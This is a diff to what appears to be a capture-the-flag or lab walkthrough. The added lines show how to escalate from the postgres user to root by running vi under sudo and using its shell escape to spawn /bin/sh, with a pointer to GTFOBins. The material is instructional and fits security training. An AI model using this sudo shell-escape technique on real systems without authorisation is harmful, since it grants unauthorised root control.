@@ -155,13 +155,18 @@ ssh postgres@{IP}
 ```sh
 sudo -l
 #This command shows what priviliges we have
-
-
 ```
 ![image](https://user-images.githubusercontent.com/99097743/169922058-3c2726ef-1d10-4ef2-802b-a762a960e19f.png)
 
-We can run binaries but we need to use GTFObins to bypass restrictions to run binaries
+We can run binaries but we need to use **GTFObins** (https://gtfobins.github.io/) to bypass restrictions to run binaries
 
-https://gtfobins.github.io/
+```sh
+sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+#(click) : (type) shell=/bin/sh (click enter)
+#(click) : (type) shell
+
+whoami
+# should be root
+```
 
 
